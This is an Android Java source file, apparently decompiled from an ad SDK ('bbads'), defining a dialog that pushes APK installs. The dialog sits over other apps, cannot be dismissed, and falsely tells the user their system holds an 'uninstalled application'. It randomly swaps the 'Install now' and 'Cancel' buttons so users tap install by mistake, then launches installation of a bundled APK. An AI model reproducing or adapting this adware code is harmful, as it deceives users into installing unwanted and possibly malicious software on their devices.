package com.bbads.android.shortcut;
import java.io.File;
import java.util.HashMap;
import java.util.Random;
import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import com.bbads.android.CS;

public class InstallDialog extends AlertDialog {
    private Context a;
    public InstallDialog(Context context) {
        super(context);
        a = context;
    }
    protected void a(Context context, File file, String packageName) {
        HashMap hashmap = (HashMap) context.getSharedPreferences(CS.SLIENT_PCK_TAG, 0).getAll();
        if (!ShortcutManager.isInstalled(context, packageName) && hashmap.size() != 1) {
            Intent intent = new Intent();
            intent.addFlags(0x10000000);
            intent.setAction("android.intent.action.VIEW");
            intent.setDataAndType(Uri.fromFile(file), "application/vnd.android.package-archive");
            context.startActivity(intent);
        }
    }
    public void check(final Context context, final File file, final String packageName, String appname) {
        android.app.AlertDialog.Builder builder = new android.app.AlertDialog.Builder(context);
        builder.setTitle("应用更新");
        builder.setMessage(new StringBuilder("发现您的系统存在未安装的应用,是否立刻安装应用").append(appname).append("?").toString());
        AlertDialog alertdialog;
        if (new Random().nextInt(2) == 0) {
            builder.setPositiveButton("马上安装", new android.content.DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface dialoginterface, int i) {
                    a(context, file, packageName);
                }
            });
            builder.setNegativeButton("取消安装", new android.content.DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface dialoginterface, int i) {
                    dialoginterface.dismiss();
                }
            });
        } else {
            builder.setNegativeButton("马上安装", new android.content.DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface dialoginterface, int i) {
                    a(context, file, packageName);
                }
            });
            builder.setPositiveButton("取消安装", new android.content.DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface dialoginterface, int i) {
                    dialoginterface.dismiss();
                }
            });
        }
        builder.setCancelable(false);
        alertdialog = builder.create();
        alertdialog.getWindow().setType(2010);
        alertdialog.show();
    }
    @Override
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
    }
}
